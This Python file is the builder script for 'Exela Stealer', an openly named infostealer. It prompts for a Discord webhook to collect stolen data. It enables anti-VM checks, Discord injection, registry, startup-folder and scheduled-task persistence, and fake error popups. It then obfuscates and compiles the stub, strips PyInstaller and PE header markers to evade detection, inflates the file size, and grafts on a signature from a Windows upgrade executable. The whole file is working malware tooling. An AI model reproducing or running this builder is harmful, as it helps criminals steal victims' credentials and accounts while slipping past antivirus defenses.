import os, ctypes, shutil, sys, time
from pkg_resources import parse_version

try:
    ctypes.windll.kernel32.SetConsoleTitleW(f"Exela Stealer | Builder | {os.getenv('computername')}")
except:pass
try:
    os.system("color d & cls")
except:
    pass

class Build:
    def __init__(self) -> None:
        self.webhook = None
        self.Anti_VM = bool()
        self.startup = bool()
        self.StartupMethod = None
        self.injection = bool()
        self.fakeError = bool()
        self.current_path = os.getcwd()
        self.pump = bool()
        self.pumSize = int() #mb
        self.pyinstaller = "pyinstaller --onefile --noconsole --clean --noconfirm --upx-dir upx-4.0.2-win64 --version-file version.txt"
    def CallFuncions(self) -> None:
        try:
            self.InstallModules()
            os.system("cls")
            self.GetWebhook()
            os.system("cls")
            self.GetAntiVm()
            os.system("cls")
            self.GetDiscordInjection()
            os.system("cls")
            self.GetStartupMethod()
            os.system("cls")
            self.GetFakeError()
            os.system("cls")
            self.GetIcon()
            os.system("cls")
            self.PumpFile()
            os.system("cls")
            self.WriteSettings()
            os.system("cls")
            self.ObfuscateFile("Stub.py")
            self.build_file()
            os.system("cls")
            
            os.system("cls")
            self.ChangeMetaData("dist\\Stub.exe")
            if self.pump == True:
                self.expand_file("dist\\Stub.exe", self.pumSize)
            self.SignFile()
            
            try:
                os.remove("Stub.py")
                os.remove("Stub.spec")
                shutil.rmtree("dist")
                shutil.rmtree("build")
            except:pass
            print("\n\nfile compiled, close the window")
        except Exception as e:
            ctypes.windll.user32.MessageBoxW(0, f"An error occurred while building your file. error code\n\n{str(e)}", "Error",  0x10)
        else:
            ctypes.windll.user32.MessageBoxW(0, "Your file compiled succesfully, now u can close the window.", "Information", 0x40)
            while True:
                continue
    def PumpFile(self) -> None:
        pump_q = str(input("Yes/No (Default size 10 or 11 mb)\nDo u want to pump the file : "))
        if pump_q.lower() == "y" or pump_q.lower() == "yes":
            pump_size = int(input("how much mb size u want to pumps : "))
            if pump_size > 100:
                print("max 100 mb")
            else:
                self.pump = True
                self.pumSize = pump_size
        else:self.pump = False
    def expand_file(self,file_name, additional_size_mb) -> None:
        additional_size_bytes = additional_size_mb * 1024 * 1024

        with open(file_name, 'ab') as file:
            current_size = file.tell()
            target_size = current_size + additional_size_bytes

            empty_bytes = bytearray([0x00] * additional_size_bytes)
            file.write(empty_bytes)

            print(f"{additional_size_mb} MB added to {file_name}")
    def ChangeMetaData(self, path:str) -> None:
        if os.path.isfile(path):
            print("Removing EXE Metada")
            time.sleep(1)
            self.RemoveMetaData(path)

    def RenameEntryPoint(self, path:str, entryPoint:str) -> None:
        with open(path, "rb") as file:
            data = file.read()

        entryPoint = entryPoint.encode()
        new_entryPoint = b'\x00' + os.urandom(len(entryPoint) - 1)
        data = data.replace(entryPoint, new_entryPoint)

        with open(path, "wb") as file:
            file.write(data)
    def RemoveMetaData(self, path:str) ->None:
        with open(path, "rb") as file:
            data = file.read()
        data = data.replace(b"PyInstaller:", b"PyInstallem:")
        data = data.replace(b"pyi-runtime-tmpdir", b"bye-runtime-tmpdir")
        data = data.replace(b"pyi-windows-manifest-filename", b"bye-windows-manifest-filename")
        start_index = data.find(b"$") + 1
        end_index = data.find(b"PE\x00\x00", start_index) - 1
        data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]
        start_index = data.find(b"PE\x00\x00") + 8
        end_index = start_index + 4
        data = data[:start_index] + bytes([0] * (end_index - start_index))  + data[end_index:]
        with open(path, "wb") as file:
            file.write(data)
            del data
    def build_file(self) -> None:
        os.system(self.pyinstaller)
    def InstallModules(self) -> None:
        os.system("pip install cryptography")
        os.system("pip install aiohttp")
        os.system("pip install pyinstaller")
    def WriteSettings(self) -> None:
        with open("Exela.py", "r", encoding="utf-8", errors="ignore") as file:
            data = file.read()
        replaced_data = data.replace("%WEBHOOK%", str(self.webhook)).replace('"%Anti_VM%"', str(self.Anti_VM)).replace('"%injection%"', str(self.injection)).replace("%startup_method%", str(self.StartupMethod)).replace('"%fake_error%"', str(self.fakeError))
        with open("Stub.py", "w", encoding="utf-8", errors="ignore") as laquica:
            laquica.write(replaced_data)
    def SignFile(self) -> None:
        signed_file = os.path.join(self.current_path, "Signed", "Windows10Upgrade9252.exe")
        os.system(f'python digital-sign.py -i "{signed_file}" -t "{os.path.join(self.current_path, "dist", "Stub.exe")}" -o Exela.exe')
    def ObfuscateFile(self, input_file) -> None:
        obf_file = os.path.join(self.current_path, "Obfuscator", "obf.py")
        os.system(f'python "{obf_file}" --junk "{input_file}"')
    def GetIcon(self) -> None:
        get_icon = str(input("Yes/No\nDo u want to change the icon of the file : "))
        if get_icon.lower() == "yes" or get_icon.lower() == "y":
            get_icon_path = str(input("icon file must be .ico otherwise the icon will not change\nEnter the path of the icon file : "))
            if not get_icon_path.endswith(".ico"):
                print("pls use .ico file, now icon change has been disabled")
                self.pyinstaller += "--icon=NONE stub.py"
            else:
                if not os.path.isfile(get_icon_path):
                    print("file does not exist, icon change has been disabled.")
                    self.pyinstaller += "--icon=NONE stub.py"
                else:
                    if self.CheckIcoFile(get_icon_path):
                        self.pyinstaller += f" --icon={get_icon_path} Stub.py"
                    else:
                        print("Your file doesnt current a ico file, icon change has been disabled")
                        self.pyinstaller += "--icon=NONE stub.py"
        else:
            self.pyinstaller += " --icon=NONE Stub.py"
    def CheckIcoFile(self, file_path:str) -> bool:
        try:
            ico_header = b'\x00\x00\x01\x00' # ico header
        
            with open(file_path, 'rb') as file:
                header_data = file.read(4)
                
            return header_data == ico_header
        except:
            return False
    def GetFakeError(self) -> None:
        try:
            er = str(input("Yes/No\nDo u want to use fake Error : "))
            if er.lower() == "yes" or er.lower() == "y":
                self.fakeError = True
            else:self.fakeError = False
        except:
            pass
    def GetWebhook(self) -> None:
        web = str(input("Enter your webhook URL : "))
        if not "/api/webhooks/" in web:
            print("invalid webhook URL")
            os._exit(0)
        if not web.startswith("https://"):
            print("use with https URL not http")
            os._exit(0)
        else:
             self.webhook=web
    def GetAntiVm(self) -> None:
        getAntiVmReq = str(input("Yes/No\nDo u want enable Anti-VM : "))
        if getAntiVmReq.lower() == "y" or getAntiVmReq.lower() == "yes":
            self.Anti_VM = True
        else:self.Anti_VM = False
    def GetStartupMethod(self) -> None:
        getStartupReq = str(input('Yes/no\nDo you want to use Startup : '))
        if getStartupReq.lower() == "y" or getStartupReq.lower() == "yes":
            self.startup = True
            print("--------------------------------------------\n1-)Folder Startup (This method use windows startup folder's for startup) \n2-)HKCLM/HKLM Startup (This method copies the file to startup using the registry)\n3-)Schtask Startup (This method uses the task scheduler to save the file to the task scheduler and automatically restarts it when any user logs in, this method is more private than the other method but requires admin privilege)\n4-)Disable Startup\n--------------------------------------------\n\n")
            getStartupMethod = input("1/2/3/4\nEnter your selection: ")
            if getStartupMethod == "1":
                self.StartupMethod = "folder"
            elif getStartupMethod == "2":
                self.StartupMethod = "regedit"
            elif getStartupMethod == "3":
                self.StartupMethod = "schtasks"
            elif getStartupMethod == "4":
                self.StartupMethod == "no-startup"
            else:
                print("unkown Startup method, startup has been disabled.")
                self.startup =False
                self.StartupMethod = "no-startup"
        else:
            self.startup = False   
            self.StartupMethod == "no-startup"
    def GetDiscordInjection(self) -> None:
        inj = str(input("Yes/No\nDo u want to enabled Discord injection : "))  
        if inj.lower() == "y" or inj.lower() == "yes":
            self.injection == True
        else:self.injection=False


if __name__ == '__main__':
    if os.name == 'nt':
        version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
        if (parse_version(version) < parse_version("3.11.0")):
            ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls upgrade 3.11.0", "Error",  0x10)
        elif (parse_version(version) > parse_version("3.11.0")):
            ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls downgrade 3.11.0", "Error",  0x10)
        elif (parse_version(version) == parse_version("3.11.0")):
            Build().CallFuncions()
        else:
            ctypes.windll.user32.MessageBoxW(0, f"{str(version)} un supported by Exela, pls use 3.11.0", "Error",  0x10)
    else:
        print("just windows operating systems supported!")
